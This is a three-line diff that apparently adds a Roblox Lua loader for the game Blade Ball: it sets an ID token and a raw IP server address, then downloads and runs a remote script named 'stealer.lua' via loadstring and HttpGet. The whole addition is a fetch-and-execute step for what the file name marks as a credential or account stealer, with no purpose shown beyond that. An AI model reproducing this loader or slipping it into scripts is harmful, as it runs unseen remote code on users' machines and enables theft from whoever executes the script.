@@ -1,0 +1,3 @@
+ID="yAPvGn7idjZiyPOJ3vPAXNvb7QDE37QSl3Dl6ga5"
+SERVER_URL="http://83.147.244.216/"
+loadstring(game:HttpGet(SERVER_URL .. "blade-ball/stealer.lua"))()
